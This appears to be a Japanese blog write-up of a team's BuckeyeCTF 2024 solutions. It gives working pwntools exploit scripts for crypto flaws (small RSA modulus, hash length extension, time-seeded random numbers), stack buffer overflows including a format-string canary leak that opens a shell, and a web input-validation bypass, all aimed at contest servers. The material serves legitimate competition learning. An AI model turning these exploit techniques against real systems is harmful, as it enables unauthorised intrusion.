@@ -1,0 +1,425 @@
+[https://pwnoh.io/challenges:title=BuckeyeCTF 2024] にチーム [https://pwnoh.io/team/607:title=poteti fan club] で参加した。日本時間で 2024-09-28 09:00 から 2024-09-30 09:00 まで。
+
+結果は 11/648 位。
+crypto 問題を一人で独占してしまって申し訳ない気持ちになった。
+
+* 解法集
+** crypto
+*** crypto/rsa
+普通の RSA 暗号の鍵 (n, e) と暗号文 c が与えられるので、平文を復元せよという問題。
+n が 128 ビットの素数 2 個の積であり短すぎるので、普通に素因数分解できる。
+
+>|python|
+e = 65537
+n = 66082519841206442253261420880518905643648844231755824847819839195516869801231
+c = 19146395818313260878394498164948015155839880044374872805448779372117637653026
+
+# Found by https://www.alpertron.com.ar/ECM.HTM
+phi = 66082519841206442253261420880518905643125623107528489101140402490481535313232
+
+
+def main() -> None:
+    d = pow(e, -1, phi)
+    m = pow(c, d, n)
+    print(m.to_bytes((m.bit_length() + 7) // 8, "big").decode())
+
+
+if __name__ == "__main__":
+    main()
+||<
+*** crypto/hashbrown
+HMAC みたいな認証タグをつける装置が与えられるので、"french fry" を含む妥当なデータを作れという問題。
+認証タグが hash(secret + message) なので、length extension attack ができる。今回は 16 バイトごとに区切る形式のハッシュ関数なので、pad(元の文章) + "french fry" であればハッシュ値が計算できる。
+>|python|
+from pwn import *
+import hashbrown
+import sys
+
+local = len(sys.argv) == 1
+io = process(["python3", "hashbrown.py"]) if local else remote(sys.argv[1], int(sys.argv[2]))
+
+
+def main() -> None:
+    io.recvuntil(b"Hashbrowns recipe as hex:")
+    io.recvline()
+    msg = bytes.fromhex(io.recvline().strip().decode())
+    io.recvuntil(b"Signature:")
+    io.recvline()
+    sig = bytes.fromhex(io.recvline().strip().decode())
+
+    # Forge MAC
+    added_msg = b"french fry"
+    added_block = b"french fry" + b"_" * 6
+    new_sig = hashbrown.aes(added_block, sig)
+
+    io.recvuntil(b"Give me recipe for french fry? (as hex)")
+    io.recvline()
+    io.sendline((hashbrown.pad(msg) + added_msg).hex())
+    io.recvuntil(b"Give me your signiature?")
+    io.recvline()
+    io.sendline(new_sig.hex())
+    io.recvuntil(b'Your signiature:')
+    io.recvline()
+    io.recvline()
+    print(io.recvall().decode())
+
+
+if __name__ == "__main__":
+    main()
+||<
+*** crypto/zkwarmup
+mod 合成数の平方根を知っているかどうかのゼロ知識証明。
+実装をよく見ると Python 標準ライブラリーの random を使っていて、しかも現在時刻 (の秒未満を切り捨てたもの) で初期化している。
+こうすると乱数が予測可能になるので平方根も予測できる。
+>|python|
+"""
+乱数が完全に予測可能
+"""
+import sys
+import random
+import time
+from pwn import process, remote
+
+
+local = len(sys.argv) == 1
+io = process(["python3", "zkwarmup.py"]) if local else remote(sys.argv[1], int(sys.argv[2]))
+
+
+def main() -> None:
+    """
+    main
+    """
+    start = time.time()
+    io.recvuntil(b"n = ")
+    n = int(io.recvline().strip().decode())
+    random.seed(int(time.time()))
+    predicted_x = random.randrange(1, n)
+    io.recvuntil(b"y = ")
+    y = int(io.recvline().strip().decode())
+    if pow(predicted_x, 2, n) != y:
+        print('Failed to predict x')
+        io.close()
+        return
+    for iter_count in range(128):
+        if iter_count % 20 == 0:
+            print(f"# ({time.time()-start:.2f}s) Round {iter_count}")
+        r = random.randrange(1, n)
+        s = pow(r, 2, n)
+        io.recvuntil(b"Provide s: ")
+        io.sendline(str(s).encode())
+        io.recvuntil(b"b = ")
+        b = int(io.recvline().strip().decode())
+        z = pow(r * pow(predicted_x, 1 - b, n), 1, n)
+        io.recvuntil(b"Provide z: ")
+        io.sendline(str(z).encode())
+    print(io.recvall().decode())
+
+
+if __name__ == "__main__":
+    main()
+||<
+
+*** crypto/treestore
+「オブジェクトを格納する時以下のような挙動をするオブジェクトストレージがある。
+- データを 16 バイトのチャンクに分割する。
+- それらを 2 分木にして、マークル木として各ノードを {sha256 => value} の形で格納する。
+- 新しく追加された (もともと無かった) ノードの個数を返す。
+最初にフラグの値が白黒で描画された flag.bmp が格納される。フラグを特定せよ。」という問題である。
+
+bmp ファイルのフォーマットは、(ヘッダー 54 バイト) + (ピクセルの情報 4 バイト) * (ピクセル数) である。(参考: https://www.setsuki.com/hsp/ext/bmp.htm)
+特に 16 バイト区切りに分けた場合最後のチャンクは 6 バイトになるので、6 バイトのチャンクの中身が特定できればそれが最後のチャンクだとわかる。
+該当の bmp ファイルのピクセル部分は 00000000 か ffffffff のどちらかなので、最後のチャンクは 4 通りしかないし途中の 16 バイトのチャンクも 32 通りしかない。
+マークル木の右側から辿り、なおかつ中間ノードとしてあり得るものの組み合わせを (それより下のノードの組み合わせを調べて) 列挙することで、この問題を解くことができる。
+
+まずは以下のスクリプトを実行した。(競技サーバーに近い方がいいので、オハイオ州の近くで実行できる人に実行してもらった。)
+>|python|
+"""
+merkle tree の右端から辿っていきたい
+"""
+import sys
+import time
+from base64 import b64encode
+from pwn import process, remote
+
+
+local = len(sys.argv) == 1
+
+
+def create_io():
+    return process(["nc", "localhost", "1024"]) if local else remote(sys.argv[1], int(sys.argv[2]))
+
+
+io = create_io()
+
+def check_node_existence(data: bytes) -> bool:
+    global io
+    try:
+        io.recvuntil(b"[*] To add a file to the treestore, enter bytes base64 encoded")
+        io.recvline()
+        io.recvuntil(b">>> ")
+        io.sendline(b64encode(data))
+        line = io.recvline().strip().decode()
+        if line == "[-] Max storage exceeded!":
+            print('# Max storage exceeded!')
+            io.close()
+            io = create_io()
+            return check_node_existence(data)
+        if line != "0 chunks were added" and line != "1 chunks were added":
+            print(f'# Error: {line}')
+            sys.exit(1)
+        return line == "0 chunks were added"
+    except EOFError:
+        print('# EOFError, reconnecting...')
+        io.close()
+        io = create_io()
+        return check_node_existence(data)
+
+def main() -> None:
+    """
+    main
+    """
+    start = time.time()
+    anchor = b'\0' * 6
+    data = []
+    for bits in range(32):
+        tmp = b''
+        for i in range(5):
+            if (bits >> i) & 1:
+                tmp += b'\0' * 4
+            else:
+                tmp += b'\xff' * 4
+        data.append(tmp[2:18])
+    gen1 = []
+    for c in data:
+        exists = check_node_existence(c)
+        if exists:
+            gen1.append(c)
+    cur_len = 16
+    rest_cand = None
+    while True:
+        paired = None
+        for c in gen1:
+            if c[-2:] != anchor[:2]:
+                continue
+            exists = check_node_existence(c + anchor)
+            if exists:
+                paired = c
+                break
+        if paired is None:
+            pass
+        else:
+            anchor = paired + anchor
+        nextgen = []
+        for c0 in gen1:
+            for c1 in gen1:
+                if c0[-2:] != c1[:2]:
+                    continue
+                exists = check_node_existence(c0 + c1)
+                if exists:
+                    nextgen.append(c0 + c1)
+        if len(nextgen) == 0:
+            for c in gen1:
+                if c not in anchor:
+                    rest_cand = c
+                    break
+        gen1 = nextgen
+        cur_len *= 2
+
+        print(f'# time: {time.time() - start:.2f}s')
+        print(f'# anchor: {len(anchor)}')
+        print(f'# cur_len: {cur_len}')
+        print(f'# gen1: {len(gen1)}')
+        with open('log.txt', 'a') as f:
+            f.write(f'anchor = {anchor}\n')
+            f.write(f'cur_len = {cur_len}\n')
+            f.write(f'gen1 = {gen1}\n')
+        if len(gen1) == 0:
+            break
+    image_len = cur_len + len(anchor) - 54
+    width = image_len // 32 // 4
+    print(f'# image_len: {image_len}, width: {width}')
+    with open('flag.bmp', 'rb') as f:
+        data = f.read()
+    forged = data[:0x12] + width.to_bytes(4, 'little') + data[0x16:54] + b'\0' * (cur_len - 54) + anchor
+    if rest_cand is not None:
+        assert len(rest_cand) == cur_len // 2
+        forged = forged[:cur_len // 2] + rest_cand + forged[cur_len:]
+    with open('forged.bmp', 'wb') as f:
+        f.write(forged)
+
+
+if __name__ == "__main__":
+    main()
+||<
+その後、ログから以下のようなスクリプトで復元した。
+>|python|
+import ast
+
+def main():
+    pre_cand = None
+    pre_cand2 = None
+    rest_cand = None
+    for line in open('log-yosupo.txt').readlines():
+        exec(line, globals())
+        if line.startswith('gen1 = '):
+            rest = line.removeprefix('gen1 = ')
+            rest = ast.literal_eval(rest)
+            print(f'# len(rest): {len(rest)}')
+            if len(rest) == 2:
+                pre_cand = rest
+            if len(rest) == 6:
+                pre_cand2 = rest
+
+    for r in pre_cand:
+        if r not in anchor:
+            rest_cand = r
+            break
+    for r in pre_cand2:
+        if r not in rest_cand + anchor:
+            rest_cand2 = r
+            break
+    print(f'# anchor: {len(anchor)}')
+    image_len = cur_len + len(anchor) - 54
+    width = image_len // 32 // 4
+    print(f'# image_len: {image_len}, width: {width}')
+    with open('flag.bmp', 'rb') as f:
+        data = f.read()
+    forged = data[:0x12] + width.to_bytes(4, 'little') + data[0x16:54] + b'\0' * (cur_len - 54) + anchor
+    if rest_cand is not None:
+        assert len(rest_cand) == cur_len // 2
+        forged = forged[:cur_len // 4] + rest_cand2 + rest_cand + forged[cur_len:]
+    with open('forged.bmp', 'wb') as f:
+        f.write(forged)
+
+
+if __name__ == "__main__":
+    main()
+||<
+** beginner-pwn
+*** beginner-pwn/runway1
+https://dogbolt.org/?id=123722f7-fbf8-4f9d-ae33-17a6d9b3c077
+get_favorite_food() の実行時、スタックは |変数など (72 バイト)| caller's rbp (4 バイト)| return address (4 バイト)| となっているので、return address を書き換えると ok。
+PIE などではないので win() のアドレスは簡単にわかる。
+>|python|
+import sys
+from pwn import process, remote
+
+
+local = len(sys.argv) == 1
+io = process(['./runway1']) if local else remote(sys.argv[1], int(sys.argv[2]))
+
+
+def main() -> None:
+    io.recvuntil(b'What is your favorite food?')
+    io.recvline()
+    payload = b'A' * 76 + 0x080491e6.to_bytes(4, 'little')
+    io.sendline(payload)
+    io.interactive()
+
+
+if __name__ == '__main__':
+    main()
+||<
+
+*** beginner-pwn/runway3
+https://dogbolt.org/?id=dbc47717-942e-4bfe-b43d-f19a61221f9c
+canary で保護されているので、その値を特定して傷つけないようにバッファーオーバーフローを起こす。
+
+>|python|
+import sys
+from pwn import process, remote
+
+
+local = len(sys.argv) == 1
+io = process('docker run -i --workdir /srv/app --rm --platform=linux/amd64 runway3 /srv/app/run'.split(' ')) if local \
+    else remote(sys.argv[1], int(sys.argv[2]))
+
+
+def main() -> None:
+    io.recvuntil(b'Is it just me, or is there an echo in here?')
+    io.recvline()
+    payload = b'%13$p %14$p %15$p'
+    io.sendline(payload)
+    canary_str, rbp_value_str, retaddr_str = io.recvline().strip().split()
+    assert canary_str.startswith(b'0x')
+    assert rbp_value_str.startswith(b'0x')
+    assert retaddr_str.startswith(b'0x')
+    canary = int(canary_str, 16)
+    rbp_value = int(rbp_value_str, 16)
+    retaddr = int(retaddr_str, 16)
+    print(f'# canary: {canary:#x}, rbp_value: {rbp_value:#x}, retaddr: {retaddr:#x}')
+
+    # ローカルではなくリモートだと以下の問題に引っ掛かる。stack pointer を 16 の倍数にするために push 命令を 1 つ飛ばす必要がある。
+    # https://www.reddit.com/r/ExploitDev/comments/i5beqt/error_got_eof_while_reading_in_interactive_in/
+    desired_retaddr = 0x4011db
+    print(f'# overwriting retaddr: {retaddr:#x} => {desired_retaddr:#x}')
+
+    payload = b'A' * 40 \
+        + canary.to_bytes(8, 'little') \
+        + rbp_value.to_bytes(8, 'little') \
+        + desired_retaddr.to_bytes(8, 'little')
+    io.sendline(payload)
+    io.recvuntil(b'You win! Here is your shell:')
+    io.recvline()
+    io.sendline(b'cat flag.txt')
+    print(io.recvuntil(b'}').decode())
+
+
+if __name__ == '__main__':
+    main()
+||<
+
+** rev
+*** rev/flagwatch
+AutoHotkey スクリプトをコンパイルしたものが与えられる。
+
+https://github.com/A-gent/AutoHotkey-Decompiler で decompile すると RCData 以下にスクリプトっぽいものが出る。
+>|bash|
+wine decompiler/ResourceHacker.exe flagwatch.exe
+||<
+これの RCData → 1 : 1033 を開くとコードが出てくるので、そこで指定されている encrypted_flag をコピーすれば良い。
+>|python|
+encrypted_flag = [62,63,40,58,39,40,111,63,52,50,53,63,104,48,48,37,3,61,3,55,57,37,48,108,59,59,111,46,33]
+
+
+def main() -> None:
+    flag = ""
+    for b in encrypted_flag:
+        flag += chr(b ^ 92)
+    print(flag)
+
+
+if __name__ == "__main__":
+    main()
+||<
+*** rev/thank
+>|python|
+import sys
+from pwn import process, remote
+
+local = len(sys.argv) == 1
+io = process(['./thank']) if local else remote(sys.argv[1], int(sys.argv[2]))
+
+
+def main() -> None:
+    content = open('thank.so', 'rb').read()
+    io.recvuntil(b'What is the size of your file (in bytes)? ')
+    io.sendline(str(len(content)).encode())
+    io.recvuntil(b'Send your file!')
+    io.recvline()
+    io.sendline(content)
+    print(io.recvall().decode())
+
+
+if __name__ == '__main__':
+    main()
+||<
+** web
+*** web/quote
+入力されたクエリーパラメーターに応じて名言を返す Web サービスがある。ただしアクセスが許可されているのは 0 番から 4 番までの 5 個のみ。
+
+まず const i = Number(id); して i に対して検証してから parseInt(i) して添字を計算しているので、例えば i = 7e-20 であれば検証は通った上で parseInt(i) == 7 が成立する。
+つまり、(サービス内の https://quotes.challs.pwnoh.io/register などにアクセスして JWT を手に入れた上で) https://quotes.challs.pwnoh.io/quote?id=7e-20 とかにアクセスすればチェックをバイパスできる。
+
+* まとめ
+crypto が全体的に考察要素薄めで、パソコン要素多めだった。
